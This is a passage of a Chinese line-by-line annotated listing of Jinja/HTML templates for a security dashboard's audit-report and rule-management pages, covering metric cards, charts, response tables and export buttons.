| 51 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><td>{{ row.ip }}</td><td>{{ row.count }}</td></tr>` |
| 52 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 54 | 空行：分隔模板结构。 | `&nbsp;` |
| 55 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>响应与封禁</h2>` |
| 56 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 57 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>时间</th><th>动作</th><th>目标</th><th>操作人</th><th>说明</th></tr>` |
| 58 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for r in summary.responses %}` |
| 59 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr>` |
| 60 | HTML 结构：定义 `td` 元素及其属性或内容。 | `      <td>{{ r.timestamp }}</td>` |
| 61 | HTML 结构：定义 `td` 元素及其属性或内容。 | `      <td>{{ r.action }}</td>` |
| 62 | HTML 结构：定义 `td` 元素及其属性或内容。 | `      <td>{{ r.target }}</td>` |
| 63 | HTML 结构：定义 `td` 元素及其属性或内容。 | `      <td>{{ r.operator or '—' }}</td>` |
| 64 | HTML 结构：定义 `td` 元素及其属性或内容。 | `      <td>{{ r.reason or '—' }}</td>` |
| 65 | 标签闭合：结束当前 HTML 元素。 | `    </tr>` |
| 66 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 67 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 68 | 空行：分隔模板结构。 | `&nbsp;` |
| 69 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>模型版本与检测质量</h2>` |
| 70 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 71 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for k, v in summary.model_performance.items() %}` |
| 72 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% if k != 'confidence_distribution' %}` |
| 73 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>{{ k }}</th><td>{{ v }}</td></tr>` |
| 74 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endif %}` |
| 75 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 76 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 77 | HTML 结构：定义 `table` 元素及其属性或内容。 | `  <table>` |
| 78 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><th>置信度区间</th><th>计数</th></tr>` |
| 79 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for row in summary.model_performance.confidence_distribution %}` |
| 80 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `    <tr><td>{{ row.range }}</td><td>{{ row.count }}</td></tr>` |
| 81 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 82 | 标签闭合：结束当前 HTML 元素。 | `  </table>` |
| 83 | 空行：分隔模板结构。 | `&nbsp;` |
| 84 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `  <h2>加固建议</h2>` |
| 85 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `  <ul>` |
| 86 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% for rec in summary.recommendations %}` |
| 87 | HTML 结构：定义 `li` 元素及其属性或内容。 | `    <li><strong>[{{ rec.severity }}]</strong> {{ rec.title }} — {{ rec.body }}</li>` |
| 88 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% endfor %}` |
| 89 | 标签闭合：结束当前 HTML 元素。 | `  </ul>` |
| 90 | 空行：分隔模板结构。 | `&nbsp;` |
| 91 | HTML 结构：定义 `p` 元素及其属性或内容。 | `  <p class="muted">PDF 导出：请使用浏览器打印本页并选择「另存为 PDF」（后续可接入无头浏览器或专用渲染服务）。</p>` |
| 92 | 标签闭合：结束当前 HTML 元素。 | `</body>` |
| 93 | 标签闭合：结束当前 HTML 元素。 | `</html>` |

## `web/templates/reports.html`

- 类型：前端页面模板
- 行数：228

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  审计报告（Reports）— DESIGN.md §4.9 + §8.6` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `  约束：` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 浅色模式：通过 <html data-theme="report"> 切换，避免 FOUC` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    - 报告模块：概览 → 威胁统计 → 响应记录 → 模型性能 → 建议` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - 导出：PDF（浏览器打印）/ HTML（保存页面）/ JSON（原始数据）` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `    - 打印友好：@page A4、隐藏侧栏/顶栏/工具栏` |
| 11 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 12 | 空行：分隔模板结构。 | `&nbsp;` |
| 13 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block html_attrs %}data-theme="report"{% endblock %}` |
| 14 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block color_scheme %}light{% endblock %}` |
| 15 | 空行：分隔模板结构。 | `&nbsp;` |
| 16 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}安全审计报告 · AI Security Guardian{% endblock %}` |
| 17 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}审计报告{% endblock %}` |
| 18 | 空行：分隔模板结构。 | `&nbsp;` |
| 19 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block extra_styles %}` |
| 20 | 资源引用：加载页面样式或外部资源。 | `  <link rel="stylesheet" href="{{ url_for('static', filename='css/reports.css') }}" />` |
| 21 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 22 | 空行：分隔模板结构。 | `&nbsp;` |
| 23 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 24 | HTML 结构：定义 `span` 元素及其属性或内容。 | `  <span class="text-tertiary" style="font-size: var(--fs-caption)">报告以浅色模式呈现，便于打印与归档</span>` |
| 25 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 26 | 空行：分隔模板结构。 | `&nbsp;` |
| 27 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 28 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div class="report-root" id="report-root">` |
| 29 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-toolbar" aria-label="报告操作">` |
| 30 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="filter-bar__group" style="padding: 0; margin: 0">` |
| 31 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="filter-bar__label">周期</span>` |
| 32 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="btn-group" role="group" aria-label="报告周期">` |
| 33 | 按钮控件：提供可点击操作入口。 | `          <button class="btn is-active" type="button" data-period="day">日报</button>` |
| 34 | 按钮控件：提供可点击操作入口。 | `          <button class="btn" type="button" data-period="week">周报</button>` |
| 35 | 按钮控件：提供可点击操作入口。 | `          <button class="btn" type="button" data-period="month">月报</button>` |
| 36 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 37 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 38 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-toolbar__actions">` |
| 39 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--ghost btn--sm" id="btn-refresh" type="button">重新生成</button>` |
| 40 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--ghost btn--sm" id="btn-export-json" type="button">导出 JSON</button>` |
| 41 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--ghost btn--sm" id="btn-export-html" type="button">导出 HTML</button>` |
| 42 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--primary btn--sm" id="btn-export-pdf" type="button">导出 PDF</button>` |
| 43 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 44 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 45 | 空行：分隔模板结构。 | `&nbsp;` |
| 46 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 封面 / 元信息 ===== -#}` |
| 47 | HTML 结构：定义 `header` 元素及其属性或内容。 | `    <header class="report-cover">` |
| 48 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div>` |
| 49 | HTML 结构：定义 `h1` 元素及其属性或内容。 | `        <h1 class="report-cover__title" id="cover-title">AI 安全守卫 · 安全审计日报</h1>` |
| 50 | HTML 结构：定义 `p` 元素及其属性或内容。 | `        <p class="report-cover__subtitle" id="cover-subtitle">` |
| 51 | 文本内容：作为页面可见文案或模板数据。 | `          生成于 <span id="cover-generated">—</span> · 数据窗口` |
| 52 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span id="cover-window" class="mono">—</span>` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `        </p>` |
| 54 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 55 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-cover__meta">` |
| 56 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div>Model: <span id="cover-model">—</span></div>` |
| 57 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div>Security Score: <span id="cover-score">—</span> / 100</div>` |
| 58 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div>Report Version: Phase 7 R1</div>` |
| 59 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 60 | 标签闭合：结束当前 HTML 元素。 | `    </header>` |
| 61 | 空行：分隔模板结构。 | `&nbsp;` |
| 62 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 1. 概览 ===== -#}` |
| 63 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-section" id="section-overview">` |
| 64 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="report-section__title">1. 概览</h2>` |
| 65 | HTML 结构：定义 `p` 元素及其属性或内容。 | `      <p class="report-section__subtitle">本周期内的关键安全指标快照。</p>` |
| 66 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-section__body">` |
| 67 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="report-overview" id="overview-grid">` |
| 68 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 69 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">告警总数</span>` |
| 70 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="total_alerts">—</span>` |
| 71 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__hint">本周期新产生</span>` |
| 72 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 73 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--danger">` |
| 74 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">严重 / 高危</span>` |
| 75 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="critical_high">—</span>` |
| 76 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__hint">严重 + 高危之和</span>` |
| 77 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 78 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--warning">` |
| 79 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">未处置</span>` |
| 80 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="open_alerts">—</span>` |
| 81 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__hint">状态 = open</span>` |
| 82 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 83 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--success">` |
| 84 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">已处置</span>` |
| 85 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="resolved_alerts">—</span>` |
| 86 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__hint">状态 = resolved</span>` |
| 87 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 88 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--info">` |
| 89 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">封禁 IP</span>` |
| 90 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="banned_ips">—</span>` |
| 91 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 92 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 93 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">IOC 条目</span>` |
| 94 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="iocs_total">—</span>` |
| 95 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 96 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 97 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">启用规则 / 总规则</span>` |
| 98 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="rules_ratio">—</span>` |
| 99 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 100 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--success">` |
| 101 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">安全评分</span>` |
| 102 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-metric="security_score">—</span>` |
| 103 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 104 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 105 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 106 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 107 | 空行：分隔模板结构。 | `&nbsp;` |
| 108 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 2. 威胁统计 ===== -#}` |
| 109 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-section" id="section-threats">` |
| 110 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="report-section__title">2. 威胁统计</h2>` |
| 111 | HTML 结构：定义 `p` 元素及其属性或内容。 | `      <p class="report-section__subtitle">按等级、类型、来源分布，以及时间走势。</p>` |
| 112 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-section__body">` |
| 113 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="report-threats">` |
| 114 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-chart">` |
| 115 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `            <h3 class="report-chart__title">按威胁等级</h3>` |
| 116 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="report-chart__body" id="chart-level"></div>` |
| 117 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 118 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-chart">` |
| 119 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `            <h3 class="report-chart__title">按攻击类型（Top 10）</h3>` |
| 120 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="report-chart__body" id="chart-type"></div>` |
| 121 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 122 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 123 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="report-chart" style="margin-bottom: var(--space-md)">` |
| 124 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `          <h3 class="report-chart__title">告警时间分布</h3>` |
| 125 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-chart__body" id="chart-timeline"></div>` |
| 126 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 127 | 空行：分隔模板结构。 | `&nbsp;` |
| 128 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="report-chart__title" style="margin-top: var(--space-md)">Top 10 攻击来源</h3>` |
| 129 | HTML 结构：定义 `table` 元素及其属性或内容。 | `        <table class="report-table" id="table-top-sources" aria-label="Top 攻击来源">` |
| 130 | HTML 结构：定义 `thead` 元素及其属性或内容。 | `          <thead>` |
| 131 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 132 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 48px">#</th>` |
| 133 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>来源 IP</th>` |
| 134 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 120px">命中次数</th>` |
| 135 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 136 | 标签闭合：结束当前 HTML 元素。 | `          </thead>` |
| 137 | HTML 结构：定义 `tbody` 元素及其属性或内容。 | `          <tbody>` |
| 138 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr><td colspan="3" class="text-tertiary" style="text-align: center">—</td></tr>` |
| 139 | 标签闭合：结束当前 HTML 元素。 | `          </tbody>` |
| 140 | 标签闭合：结束当前 HTML 元素。 | `        </table>` |
| 141 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 142 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 143 | 空行：分隔模板结构。 | `&nbsp;` |
| 144 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 3. 响应记录 ===== -#}` |
| 145 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-section" id="section-responses">` |
| 146 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="report-section__title">3. 响应记录</h2>` |
| 147 | HTML 结构：定义 `p` 元素及其属性或内容。 | `      <p class="report-section__subtitle">近 50 条处置动作（封禁 IP / 确认 / 已处理 / 忽略）。</p>` |
| 148 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-section__body">` |
| 149 | HTML 结构：定义 `table` 元素及其属性或内容。 | `        <table class="report-table" id="table-responses" aria-label="响应记录">` |
| 150 | HTML 结构：定义 `thead` 元素及其属性或内容。 | `          <thead>` |
| 151 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 152 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 180px">时间</th>` |
| 153 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 120px">动作</th>` |
| 154 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>目标</th>` |
| 155 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>说明</th>` |
| 156 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 100px">操作人</th>` |
| 157 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 158 | 标签闭合：结束当前 HTML 元素。 | `          </thead>` |
| 159 | HTML 结构：定义 `tbody` 元素及其属性或内容。 | `          <tbody>` |
| 160 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr><td colspan="5" class="text-tertiary" style="text-align: center">—</td></tr>` |
| 161 | 标签闭合：结束当前 HTML 元素。 | `          </tbody>` |
| 162 | 标签闭合：结束当前 HTML 元素。 | `        </table>` |
| 163 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 164 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 165 | 空行：分隔模板结构。 | `&nbsp;` |
| 166 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 4. 模型性能 ===== -#}` |
| 167 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-section" id="section-model">` |
| 168 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="report-section__title">4. 模型性能</h2>` |
| 169 | HTML 结构：定义 `p` 元素及其属性或内容。 | `      <p class="report-section__subtitle">基于本周期告警的即席统计；Phase 8 接入在线评估后将替换为真实指标。</p>` |
| 170 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-section__body">` |
| 171 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="report-overview">` |
| 172 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 173 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">模型版本</span>` |
| 174 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="version">—</span>` |
| 175 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 176 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 177 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">评估样本</span>` |
| 178 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="total_checked">—</span>` |
| 179 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 180 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--info">` |
| 181 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">平均置信度</span>` |
| 182 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="avg_confidence">—</span>` |
| 183 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 184 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--success">` |
| 185 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">高置信度占比</span>` |
| 186 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="high_confidence_ratio">—</span>` |
| 187 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 188 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric report-metric--success">` |
| 189 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">检出率（非忽略）</span>` |
| 190 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="detection_rate">—</span>` |
| 191 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 192 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-metric">` |
| 193 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__label">平均处置耗时</span>` |
| 194 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="report-metric__value" data-model="mean_resolution">—</span>` |
| 195 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 196 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 197 | 空行：分隔模板结构。 | `&nbsp;` |
| 198 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="report-chart" style="margin-top: var(--space-md)">` |
| 199 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `          <h3 class="report-chart__title">置信度分布</h3>` |
| 200 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="report-chart__body" id="chart-confidence"></div>` |
| 201 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 202 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 203 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 204 | 空行：分隔模板结构。 | `&nbsp;` |
| 205 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 5. 安全建议 ===== -#}` |
| 206 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="report-section" id="section-recommendations">` |
| 207 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="report-section__title">5. 安全建议</h2>` |
| 208 | HTML 结构：定义 `p` 元素及其属性或内容。 | `      <p class="report-section__subtitle">根据本周期数据自动生成，按严重度排序。</p>` |
| 209 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="report-section__body">` |
| 210 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `        <ul class="report-recommendations" id="recommendations-list">` |
| 211 | HTML 结构：定义 `li` 元素及其属性或内容。 | `          <li class="report-recommendations__item report-recommendations__item--info">` |
| 212 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="report-recommendations__title">正在生成建议…</div>` |
| 213 | 标签闭合：结束当前 HTML 元素。 | `          </li>` |
| 214 | 标签闭合：结束当前 HTML 元素。 | `        </ul>` |
| 215 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 216 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 217 | 空行：分隔模板结构。 | `&nbsp;` |
| 218 | HTML 结构：定义 `footer` 元素及其属性或内容。 | `    <footer class="report-footer">` |
| 219 | 文本内容：作为页面可见文案或模板数据。 | `      AI Security Guardian · 报告由系统根据当前内存中的告警 / 规则 / IOC 自动生成。` |
| 220 | 文本内容：作为页面可见文案或模板数据。 | `      如需长期归档请使用「导出 JSON」保存原始数据。` |
| 221 | 标签闭合：结束当前 HTML 元素。 | `    </footer>` |
| 222 | 标签闭合：结束当前 HTML 元素。 | `  </div>` |
| 223 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 224 | 空行：分隔模板结构。 | `&nbsp;` |
| 225 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 226 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="https://cdn.jsdelivr.net/npm/echarts@5.4.3/dist/echarts.min.js"></script>` |
| 227 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/reports.js') }}"></script>` |
| 228 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/rules.html`

- 类型：前端页面模板
- 行数：232

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  规则管理（Rules） — DESIGN.md §8.4` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `  布局契约：` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 规则列表表格：规则名称、类型、状态开关、操作（编辑 / 测试 / 删除）` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    - 新建/编辑规则：侧边抽屉面板` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - 规则测试：抽屉内嵌终端面板，输入测试数据 → 显示匹配结果` |
| 10 | 空行：分隔模板结构。 | `&nbsp;` |
| 11 | 文本内容：作为页面可见文案或模板数据。 | `  规则 schema（前后端一致）：` |
| 12 | 文本内容：作为页面可见文案或模板数据。 | `    id, name, type (signature\|anomaly\|threshold), pattern, action (alert\|block\|monitor),` |
| 13 | 文本内容：作为页面可见文案或模板数据。 | `    level (low\|medium\|high\|critical), priority (1~999), enabled (bool),` |
| 14 | 文本内容：作为页面可见文案或模板数据。 | `    description, created_at, updated_at, hits` |
| 15 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 16 | 空行：分隔模板结构。 | `&nbsp;` |
| 17 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}规则管理 · AI Security Guardian{% endblock %}` |
| 18 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}规则管理{% endblock %}` |
| 19 | 空行：分隔模板结构。 | `&nbsp;` |
| 20 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 21 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-seed" type="button" hidden>生成演示规则</button>` |
| 22 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-refresh" type="button" title="手动刷新">刷新</button>` |
| 23 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--primary btn--sm" id="btn-new-rule" type="button">新建规则</button>` |
| 24 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 25 | 空行：分隔模板结构。 | `&nbsp;` |
| 26 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 27 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="page-header" aria-label="规则统计">` |
| 28 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="page-header__meta" role="status" aria-live="polite">` |
| 29 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>当前筛选 <strong id="count-filtered">0</strong></span>` |
| 30 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>规则总数 <strong id="count-total">0</strong></span>` |
